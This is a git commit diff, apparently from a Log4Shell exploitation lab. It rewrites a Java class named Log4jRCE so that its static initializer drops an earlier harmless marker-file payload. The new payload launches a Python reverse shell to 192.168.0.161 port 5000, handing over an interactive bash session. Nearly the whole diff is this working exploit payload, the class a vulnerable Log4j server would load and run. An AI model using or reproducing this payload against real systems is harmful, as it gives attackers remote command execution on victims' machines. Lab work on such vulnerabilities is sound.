18084f5aab730374b249d38d3aeb04acf8947faa
mwalas <matwal777@gmail.com>
2024-01-10 21:39:58 +0100

    Update Dockerfile and server properties, add Log4jRCE code, and delete unnecessary files

--- codehttp/Log4jRCE.java
+++ codehttp/Log4jRCE.java
@@ -1,12 +1,14 @@
 public class Log4jRCE {
 
     static {
-       try {
-           String[] cmd = {"touch", "CODE_EXECUTED_Woooo"};
-           java.lang.Runtime.getRuntime().exec(cmd).waitFor();
-       } catch (Exception e) {
-           e.printStackTrace();
-       }
+        try {
+            String[] cmd = {
+                "bash", "-c", 
+                "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.0.161\",5000));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.Popen([\"/bin/bash\",\"-i\"]);' &"
+            };            
+            java.lang.Runtime.getRuntime().exec(cmd).waitFor();
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
     }
-
 }
